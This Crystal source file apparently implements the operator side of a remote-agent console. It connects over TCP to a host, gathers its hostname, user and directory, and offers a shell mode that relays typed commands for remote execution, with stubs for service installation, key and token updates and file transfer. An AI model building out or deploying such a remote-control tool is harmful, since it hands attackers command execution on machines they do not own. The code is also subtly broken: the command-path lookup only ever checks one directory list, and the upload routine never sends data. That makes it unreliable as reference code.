require "./bin_paths.cr"
require "./flashy_things.cr"

require "openssl"
require "socket"


GENERIC_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"


class TermFuncs

	def get_stats : Nil
	end

	def resolve_cmd(cmd : String) : String
        found = false
		full_cmd = ""
		if ! found
			BIN.each do |path|
                if cmd == path
					full_cmd = "/bin/#{cmd}"
                    found = true
                end
            end
        elsif ! found
            USR_BIN.each do |path|
                if cmd == path
                    full_cmd = "/usr/bin/#{cmd}"
                    found = true
                end
            end
        elsif ! found
            SBIN.each do |path|
                if cmd == path
                    full_cmd = "/sbin/#{cmd}"
                    found = true
                end
            end
        elsif ! found
            USR_SBIN.each do |path|
                if cmd == path
                    full_cmd = "/usr/sbin/#{cmd}"
                    found = true
                end
            end
		elsif ! found
			USR_LOCAL_BIN.each do |path|
				if cmd == path
					full_cmd = "/usr/local/bin/#{cmd}"
					found = true
				end
			end	
        end
		

		if found
			return full_cmd
		else
			return cmd
		end
	end

	def process_output(connfd : TCPSocket) : Bool
		while true
			reply = connfd.gets.to_s

			if reply.includes?("[FIN]")
				break
			else
				printf("%s\n","#{reply}")
			end
		end
		return true
	end

	def drop_to_shell(connfd : TCPSocket, hostname : (String|Nil), username : (String|Nil)) : Nil
		if username == "root"
			term_string = "[shell]:#{username}@#{hostname}#> "
		else
			term_string = "[shell]:#{username}@#{hostname}$> "
		end

		while true
			printf("%s","#{term_string}")
			cmd = gets.to_s.chomp('\n').chomp('\r')
		
			cmd_file = cmd.split(' ')[0]
			opts = cmd.split(' ')[1..].join(' ')
		
			# No $PATH exists for what we are doing, so 
			# we must facilitate resolution of the cmds	
			full_cmd = resolve_cmd(cmd_file)

			connfd << "#{full_cmd} #{opts}\r\n"
			
			if process_output(connfd)
				next
			end
		end

	connfd.close()
	return

	end
	
	def update_keys : Nil
	end

	def update_token : Nil
	end

	def update_logs : Nil
	end

	def file_upload(connfd : TCPSocket, rhost : String, rport : Int32, src : String, dst : String) : Nil
	
		begin	
			data = File.open(src,"rb") do |src_fd|
				src_fd.gets_to_end
			end
		rescue
			printf("%s\n","[-] Error opening file: #{src}")
			return
		end
			
		signature = OpenSSL::Digest.new("SHA256")

		data.each_char do |c|
			signature.update(c.to_s)
		end
		
		# printf("%s\n","[*] digest: #{signature.final.hexstring}")
			
		return
	end

	def file_download : Nil
	end

	def install_service : Nil
	end

	def test_ssl : Nil
	end

	def test_heartbeat : Nil
	end

end


class AgentTerm < TermFuncs


	def term_output : Nil
	end

	def term_func : Nil
	end

	def term_menu(rhost : String, rport : Int32) : Nil
        connfd = TCPSocket.new(rhost,rport)

        connfd << "hostname\r\n"
        hostname = connfd.gets
        connfd.gets

        connfd << "whoami\r\n"
        username = connfd.gets
        connfd.gets

		connfd << "pwd\r\n"
		pwd = connfd.gets
		connfd.gets

        while true
            printf("%s","[main]:#{hostname}> ")
            choice = gets.to_s.downcase.split(' ')
			            
			if choice[0] == "help"
				printf("%s",AGENT_MGMT_HELP)
			elsif choice[0] == "shell"
                drop_to_shell(connfd,hostname,username)
			elsif choice[0] == "upload"
						
				src = ""
				dst = ""
				if choice.size > 1
					if File.exists?(choice[1])
						src = choice[1]
						src_arr = src.split('/') 
						src_short = src_arr[src_arr.size-1]
						# optional dst file
						if choice.size > 2
							if File.exists?(choice[2])
								dst = choice[2]
							else
								p "[-] File error:  #{choice[2]}"
							end
						else
							dst = "#{pwd}/#{src_short}"
						end
					end
		
					if src.size > 0 && dst.size > 0
						file_upload(connfd, rhost, rport, src,dst)
						
						#debuggin
						#p "#{src} -> #{dst}"
					end
				
				else
					printf("%s\n","File upload usage: upload <src> <dst>")
					next				
				end
			else
                p "[-] Invalid choice"
				printf("%s",AGENT_MGMT_HELP)
            end
		end

		return	


	end

	

end
